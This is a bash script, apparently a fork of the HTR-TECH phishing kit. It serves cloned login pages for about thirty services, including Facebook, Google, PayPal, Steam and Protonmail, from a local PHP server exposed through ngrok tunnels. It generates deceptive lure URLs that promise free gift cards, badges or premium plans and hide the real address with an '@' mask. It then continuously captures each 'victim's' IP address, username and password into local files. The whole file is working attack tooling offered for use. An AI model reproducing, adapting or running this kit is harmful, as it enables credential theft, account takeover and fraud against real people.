#!/bin/bash



## ANSI colors (FG & BG)
RED="$(printf '\033[1;91m')"      # 🔴 أحمر فاتح للتحذيرات والأخطاء
GREEN="$(printf '\033[1;92m')"    # 🟢 أخضر فاتح للنجاح والرسائل الإيجابية
ORANGE="$(printf '\033[1;93m')"   # 🟠 برتقالي للإنذارات والتنبيهات
BLUE="$(printf '\033[1;94m')"     # 🔵 أزرق فاتح للعناوين والخيارات
MAGENTA="$(printf '\033[1;95m')"  # 🟣 بنفسجي غامق لعناوين فرعية وتمييز
CYAN="$(printf '\033[1;96m')"     # 🔵 سماوي للنصوص الرئيسية والتوضيحية
WHITE="$(printf '\033[1;97m')"    # ⚪ أبيض للنصوص العامة
BLACK="$(printf '\033[1;90m')"    # ⚫ رمادي غامق للنصوص الثانوية

## ألوان الخلفيات
REDBG="$(printf '\033[41m')"      # 🟥 خلفية حمراء للتنبيهات
GREENBG="$(printf '\033[42m')"    # 🟩 خلفية خضراء للنجاح
ORANGEBG="$(printf '\033[43m')"   # 🟧 خلفية برتقالية للإشعارات
BLUEBG="$(printf '\033[44m')"     # 🟦 خلفية زرقاء للعناوين الرئيسية
MAGENTABG="$(printf '\033[45m')"  # 🟪 خلفية بنفسجية للتمييز
CYANBG="$(printf '\033[46m')"     # 🟦 خلفية سماوية للعناوين الفرعية
WHITEBG="$(printf '\033[47m')"    # ⬜ خلفية بيضاء للنصوص الواضحة
BLACKBG="$(printf '\033[40m')"    # ⬛ خلفية سوداء للأقسام المهمة

RESETBG="$(printf '\e[0m\n')"     # إعادة ضبط الألوان بعد كل استخدام


## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` || `pidof ngrok2` ]]; then
		killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1
	fi
}

## Banner
banner() {
    echo -e "${BLUE}"
    cat << "EOF"
██████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░░░░░▄▀░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████████░░▄▀░░█████
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█████░░▄▀░░█████
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████
█░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░█████░░▄▀░░█████
█░░▄▀░░██░░▄▀░░█████████░░▄▀░░█████░░▄▀░░█████
█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█████░░▄▀░░█████
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█████░░░░░░█████
██████████████████████████████████████████████
EOF
    echo -e "${RESET}"
}


## Small Banner
banner_small() {
    echo -e "${BLUE}"
    cat << "EOF"

█░█ █▀ ▀█▀
█▄█ ▄█ ░█░
EOF
    echo -e "${RESET}"
}



## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing packages : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/"$2" > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/"$2" > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
		fi
	fi

	if [[ -e ".server/ngrok2" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip' 'ngrok2'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip' 'ngrok2'
		else
			download_ngrok 'https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip' 'ngrok2'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${BLUE}SLZEP
		${GREEN}Github   ${RED}:  ${BLUE}https://github.com/slzep
		${GREEN}Social   ${RED}:  ${CYAN}https://x.com/sb3ly
		${WHITE}upgrad from sb3ly from  ${RED}:  ${ORANGE}HTR-TECH

		${REDBG}${WHITE} Thanks to HTE-TECH adi1090x , MoisesTapia , Hiddeneye Team & Thelinuxchoice ${RESETBG}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}*${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}*${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}*${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} Account : ${RED}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} Password : ${RED}$PASSWORD"
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}*${RED}]${RED} Waiting for Next Login Info, ${BLUE}Ctrl + C ${RED}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}*${RED}]${RED} Waiting for Login Info, ${BLUE}Ctrl + C ${WHITE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}*${RED}]${ORANGE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}*${RED}]${ORANGE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}*${RED}]${GREEN} $2"
	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}*${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Successfully Hosted at : ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${GREEN} Localhost ${RED}[${CYAN}For Devs Only${RED}]
		${RED}[${WHITE}02${RED}]${GREEN} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
		${RED}[${WHITE}03${RED}]${GREEN} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]

	EOF

	read -p "${RED}[${WHITE}*${RED}]${BLUE} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		start_ngrok "ngrok2" "Launching Ngrok Patched..."
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${WHITE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${WHITE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${WHITE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${WHITE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}*${RED}]${RED} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://make-your-facebook-secured-and-free-from-hackers'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${WHITE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${WHITE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${WHITE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}*${RED}]${RED} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${WHITE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${WHITE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${WHITE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}*${RED}]${RED} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${WHITE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${WHITE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}*${RED}]${RED} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium-real-method-2020'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_vk; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${RED} Select An Attack For Your Victim :

		${WHITE}01${RED}] Facebook      ${WHITE}11${RED}] Twitch       ${WHITE}21${RED}] DeviantArt
		${WHITE}02${RED}] Instagram     ${WHITE}12${RED}] Pinterest    ${WHITE}22${RED}] Badoo
		${WHITE}03${RED}] Google        ${WHITE}13${RED}] Snapchat     ${WHITE}23${RED}] Origin
		${WHITE}04${RED}] Microsoft     ${WHITE}14${RED}] Linkedin     ${WHITE}24${RED}] CryptoCoin
		${WHITE}05${RED}] Netflix       ${WHITE}15${RED}] Ebay         ${WHITE}25${RED}] Yahoo
		${WHITE}06${RED}] Paypal        ${WHITE}16${RED}] Dropbox      ${WHITE}26${RED}] Wordpress
		${WHITE}07${RED}] Steam         ${WHITE}17${RED}] Protonmail   ${WHITE}27${RED}] Yandex
		${WHITE}08${RED}] Twitter       ${WHITE}18${RED}] Spotify      ${WHITE}28${RED}] StackoverFlow
		${WHITE}09${RED}] Playstation   ${WHITE}19${RED}] Reddit       ${WHITE}29${RED}] Vk
		${WHITE}10${RED}] Github        ${WHITE}20${RED}] Adobe        ${WHITE}30${RED}] XBOX

		${RED}[${WHITE}99${RED} About         ${WHITE}[${WHITE}00${RED} Exit

	EOF
	
	read -p "${WHITE}[${RED}] Select an option : ${RED}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="microsoft"
		mask='http://unlimited-onedrive-space-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="netflix"
		mask='http://upgrade-your-netflix-plan-free'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="steam"
		mask='http://steam-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="twitter"
		mask='http://get-blue-badge-on-twitter-free'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="playstation"
		mask='http://playstation-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="github"
		mask='http://get-github-pro-features-free-lifetime'
		tunnel_menu
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		mask='http://unlimited-twitch-tv-user-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		mask='http://get-a-premium-plan-for-pinterest-free'
		tunnel_menu
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		mask='http://view-locked-snapchat-accounts-secretly'
		tunnel_menu
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		mask='http://get-a-premium-plan-for-linkedin-free'
		tunnel_menu
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 16 ]]; then
		website="dropbox"
		mask='http://get-500-gb-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 17 ]]; then
		website="protonmail"
		mask='http://protonmail-pro-basics-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		mask='http://convert-your-account-to-spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		mask='http://reddit-official-verified-member-badge'
		tunnel_menu
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		mask='http://get-adobe-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 21 ]]; then
		website="deviantart"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 22 ]]; then
		website="badoo"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 23 ]]; then
		website="origin"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 24 ]]; then
		website="cryptocoinsniper"
		mask='http://get-500-btc-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 25 ]]; then
		website="yahoo"
		mask='http://grab-mail-from-anyother-yahoo-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 26 ]]; then
		website="wordpress"
		mask='http://unlimited-wordpress-traffic-free'
		tunnel_menu
	elif [[ "$REPLY" == 27 ]]; then
		website="yandex"
		mask='http://grab-mail-from-anyother-yandex-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 28 ]]; then
		website="stackoverflow"
		mask='http://get-stackoverflow-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 29 ]]; then
		site_vk
	elif [[ "$REPLY" == 30 ]]; then
		website="xbox"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
